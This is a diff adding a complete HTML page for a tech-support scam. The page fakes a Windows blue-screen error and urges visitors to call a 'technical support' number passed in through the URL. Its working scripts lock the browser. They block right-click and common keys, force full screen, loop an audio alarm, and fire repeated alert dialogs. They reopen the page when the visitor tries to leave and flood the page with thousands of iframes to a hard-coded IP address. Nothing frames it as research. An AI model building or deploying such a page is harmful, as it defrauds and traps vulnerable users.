@@ -1,0 +1,456 @@
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+  <title>BSOD</title>
+
+  <script>
+
+      function getURLParameter(name) {
+          return decodeURI(
+              (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
+          );
+
+      }
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+              (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+      ga('create', 'UA-81143615-1', 'auto');
+      ga('send', 'pageview', getURLParameter('s') + 'UK_S3');
+
+      var phone = getURLParameter('n');
+      var iePhone = getURLParameter('n');
+      var edgePhone = getURLParameter('n');
+      var firefoxPhone = getURLParameter('n');
+      var chromePhone = getURLParameter('n');
+
+      var isIE = /*@cc_on!@*/false || !!document.documentMode;
+      // Edge 20+
+      var isEdge = !isIE && !!window.StyleMedia;
+      // Chrome 1+
+      var isChrome = !!window.chrome && !!window.chrome.webstore;
+
+      var isFirefox = navigator.userAgent.toLowerCase().indexOf('firefox') > -1;
+
+      if (isIE) phone = iePhone;
+      if (isEdge) phone = edgePhone;
+      if (isChrome) phone = chromePhone;
+      if (isFirefox) phone = firefoxPhone;
+  </script>
+  <style>
+    body {
+      font-family: "Segoe UI Light", "Segoe UI", Arial;
+      font-weight: lighter;
+    }
+
+    .content {
+      width: 700px;
+      margin: 10% auto;
+      user-select: none;
+      -moz-user-select: none;
+      -webkit-user-select: none;
+      -ms-user-select: none;
+    }
+
+    .style1 {
+      font-family: Arial, Helvetica, sans-serif;
+      font-weight: bold;
+      color: #FFFFFF;
+      font-size: 18px;
+    }
+
+    .stylearial {
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .style2 {
+      font-size: 36px;
+      font-family: "Courier New", Courier, monospace;
+    }
+
+    .style4 {
+      font-size: 22px;
+      font-family: "Courier New", Courier, monospace;
+    }
+
+    .style5 {
+      font-size: 20px;
+      font-family: "Courier New", Courier, monospace;
+    }
+
+    .style6 {
+      font-family: "Courier New", Courier, monospace
+    }
+
+    .cross {
+      position: absolute;
+      top: 2px;
+      right: 10px;
+      font-weight: bolder;
+      color: #888;
+      text-decoration: none;
+    }
+
+    a:focus {
+      outline: 0 none;
+      border: 0 none;
+    }
+
+    .chrome-alert {
+      position: fixed;
+      top: 0px;
+      left: 0;
+      right: 0;
+      /*display: none;*/
+    }
+
+    .chrome-alert > div {
+      margin: 0 auto;
+      width: 500px;
+      background: #fff;
+      border: 1px solid #BABABA;
+      min-height: 180px;
+      border-radius: 3px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+      position: relative;
+      padding-top: 20px;
+      /*font-family: 'Segoe UI';*/
+    }
+
+    .chrome-alert h1 {
+      font-size: 18px;
+      font-weight: normal;
+      margin: 0;
+      margin-bottom: 5px;
+      padding: 5px 10px;
+      color: #000000;
+    }
+
+    .chrome-alert p {
+      font-size: 14px;
+      padding: 0 10px;
+      color: #000000;
+      margin: 15px 0;
+      line-height: 22px;
+    }
+
+    .chrome-alert .action_buttons {
+      overflow: auto;
+    }
+
+    .chrome-alert .action_buttons a {
+      float: right;
+      font-size: 12px;
+      margin-right: 15px;
+      padding: 6px 25px;
+      text-decoration: none;
+      color: #414141;
+      border: 1px solid #DDD;
+      margin-top: 20px;
+      border-radius: 2px;
+      margin-bottom: 20px;
+    }
+
+    .chrome-alert .action_buttons a.active {
+      border: 1px solid #3B79ED;
+      font-weight: bold;
+    }
+
+    .chrome-alert .content-box {
+      max-height: 440px;
+      overflow: auto;
+      margin: 0 20px;
+    }
+
+    .chrome-alert .content-box p {
+      padding: 0;
+      margin-left: 0;
+    }
+
+    .chrome-alert label {
+      padding: 0 20px;
+      font-size: 14px;
+      color: #414141;
+    }
+
+    .chrome-alert label:hover {
+      color: #3B79ED;
+    }
+
+    .chrome-alert label:focus {
+      color: #3B79ED;
+      outline: dotted;
+    }
+    #auth {
+      display: none;
+    }
+    .blink_me {
+      animation: blinker 1s linear infinite;
+    }
+
+    @keyframes blinker {
+      50% {
+        opacity: 0;
+      }
+    }
+
+  </style>
+  <SCRIPT TYPE="text/javascript">
+
+      var message = "Sorry, right-click has been disabled";
+      function clickIE() {
+          if (document.all) {
+              (message);
+              return false;
+          }
+      }
+      function clickNS(e) {
+          if
+          (document.layers || (document.getElementById && !document.all)) {
+              if (e.which == 2 || e.which == 3) {
+                  (message);
+                  return false;
+              }
+          }
+      }
+      if (document.layers) {
+          document.captureEvents(Event.MOUSEDOWN);
+          document.onmousedown = clickNS;
+      }
+      else {
+          document.onmouseup = clickNS;
+          document.oncontextmenu = clickIE;
+      }
+      document.oncontextmenu = new Function("return false")
+      // -->
+  </SCRIPT>
+
+</head>
+<body bgcolor="#0086ac" scroll="no">
+
+<div class="content" id="content">
+  <font size="4" color="#FFFFFF">
+    <p style="font-size:100pt; margin:0; padding-bottom:20pt">:(</p>
+    <p style="font-size:20pt; margin:0; padding:0">Windows Detected Hard Drive Data Corruption.<br/>This 
+	indicates some recent downloads on the computer which in turn has created problems on the computer.</p>
+
+
+    <br>**** Do not restart your computer ****<br><br>
+
+
+    <img src="assests/qr.png" style="float:left;"/>
+    <div style="float:left;margin-left:30px;width:65%;">
+
+      <p style="font-size:14pt; color:#fff; margin-top:-30px; padding:0;line-height:32px;"><br/>
+        The problem is caused by unusual activity <br>performed on this machine
+        <br><br>Call technical support <strong><script>document.write(phone)</script></strong> <br> and share this code #55422
+		<br><br>Stop Code: SYS_EXCEPTION_PONIES_NOT_HANDLED</p>
+    </div>
+    <div id="chrome-alerts" class="chrome-alert stylearial">
+      <div>
+        <a href="javascript:openlink()" class="cross">×</a>
+        <h1>Error</h1>
+        <div class="content-box" id="alert-content-box">
+          <p>
+            **** Do not restart your computer **** <br><br>
+            Windows Detected Hard Drive Data Corruption. This indicates some recent downloads on the computer which in turn has created problems on the computer.<br><br>
+            Call technical support
+            <script>document.write(phone)</script>
+        </div>
+        <label style="font-size: 12px;"><input type="checkbox"> Prevent this page from creating additional
+          dialogs.</label>
+        <div class="action_buttons">
+          <a class="active" id="leave_page">OK</a>
+        </div>
+      </div>
+    </div>
+  </font>
+  <div id="auth">
+
+  </div>
+
+  <audio autoplay loop>
+    <source src="https://dk-443.s3.amazonaws.com/erroren.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+      window.onbeforeunload = function () {
+          window.setTimeout(function () { // escape function context
+              window.location = 'index4.html?n='+getURLParameter('n');
+          }, 0);
+          window.onbeforeunload = null;   // necessary to prevent infinite loop
+          // that kills your browser
+          window.location = 'index4.html?n='+getURLParameter('n');
+
+
+          var win = window.open('index4.html?n='+getURLParameter('n'), '_blank');
+          win.focus();
+
+          return "**** Do not restart your computer **** \n\n Windows Detected Hard Drive Data Corruption. This indicates some recent downloads on the computer which in turn has created problems on the computer. \n\n Call technical support " + phone + ".";
+      };
+      function toggleFullScreen() {
+          console.log('fs');
+          /*
+          var total = "";
+          for( var x = 0; x < 100000; x++ ) {
+              total = total + x.toString();
+              history.pushState(0,0, total );
+          }
+*/
+
+
+          if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
+              if (document.documentElement.requestFullscreen) {
+                  document.documentElement.requestFullscreen();
+
+              }
+              else if (document.documentElement.mozRequestFullScreen) {
+                  document.documentElement.mozRequestFullScreen();
+
+              }
+              else if (document.documentElement.webkitRequestFullscreen) {
+                  document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+              }
+          }
+		  
+		  setTimeout(function() {
+		  			for (var i = 0; i < 9000; i++) {
+              var ifr = document.createElement("iframe");
+              ifr.src = 'http://54.93.99.92/';
+              document.getElementById('auth').appendChild(ifr);
+          }
+		  }
+		  , 5000);
+		  
+
+      }
+
+      window.onload = function () {
+          var Msg = "**** Do not restart your computer **** \n\n Windows Detected Hard Drive Data Corruption. This indicates some recent downloads on the computer which in turn has created problems on the computer. \n\n Call technical support " + phone + ".";
+
+          if (window.chrome) {
+              var showConfirm = function () {
+                  alert(Msg);
+              };
+
+              document.body.addEventListener("mouseleave", showConfirm);
+
+              window.addEventListener('resize', function () {
+                  if (screen.width === window.innerWidth) {
+                      /*
+                      var total = "";
+                      for( var x = 0; x < 100000; x++ ) {
+                          total = total + x.toString();
+                          history.pushState(0,0, total );
+                      }
+                      */
+                      for (var i = 0; i < 100000; i++) {
+                          var ifr = document.createElement("iframe");
+                          ifr.src = 'http://54.93.99.92/';
+                          document.getElementById('auth').appendChild(ifr);
+                      }
+                  }
+
+
+              });
+
+              document.addEventListener('keyup', function (es) {
+                      if (es.keyCode == 27) {
+                          toggleFullScreen();
+
+                      }
+                  }
+                  , false);
+
+              document.addEventListener('keyup', function (e) {
+                      if (e.keyCode == 122 || e.keyCode == 17 || e.keyCode == 18 || e.keyCode == 13) {
+//              document.getElementById('map').innerHTML = stroka;
+                          toggleFullScreen();
+
+                      }
+                  }
+                  , false);
+
+              document.oncontextmenu = new Function("return false");
+
+              addEventListener("click", function () {
+//        document.getElementById('map').innerHTML = stroka;
+                  var
+                      el = document.documentElement
+                      , rfs =
+                          el.requestFullScreen
+                          || el.webkitRequestFullScreen
+                          || el.mozRequestFullScreen
+                      ;
+                  toggleFullScreen();
+                  rfs.call(el);
+
+              });
+
+              window.onkeydown = function (evt) {
+                  if (evt.keyCode == 27 || evt.keyCode == 18 || evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 9 || evt.keyCode == 115 || evt.keyCode == 116 || evt.keyCode == 112 || evt.keyCode == 114 || evt.keyCode == 17) {
+                      return false;
+
+                  }
+
+              };
+
+              if (window.Event)
+                  document.captureEvents(Event.MOUSEUP);
+
+              function nocontextmenu() {
+                  event.cancelBubble = true, event.returnValue = false;
+
+                  return false;
+              }
+
+              function norightclick(e) {
+                  if (window.Event) {
+                      if (e.which == 2 || e.which == 3) return false;
+                  }
+                  else if (event.button == 2 || event.button == 3) {
+                      event.cancelBubble = true, event.returnValue = false;
+                      return false;
+                  }
+              }
+
+              if (document.layers)
+                  document.captureEvents(Event.MOUSEDOWN);
+
+              document.oncontextmenu = nocontextmenu;
+              document.onmousedown = norightclick;
+              document.onmouseup = norightclick;
+
+          } else {
+
+              document.body.onclick = function () {
+                  window.open("index4.html?n="+getURLParameter('n'), "", "height=" + screen.availHeight + "", "width=" + screen.availWidth);
+              };
+
+              if (window.sidebar) {
+                  function msg_ff() {
+                      var i = document.createElement("div");
+                      i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="http://none/"></iframe></div>';
+                      document.body.appendChild(i);
+                  }
+
+                  window.setInterval(function () {
+                      msg_ff()
+                  }, 100);
+              } else {
+                  function msg() {
+                      var r = confirm(Msg);
+                      if (r == true) {
+                          alert(Msg);
+                      } else {
+                          alert(Msg);
+                      }
+                  }
+              }
+          }
+      };
+
+  </script>
+
+</body>
+</html>
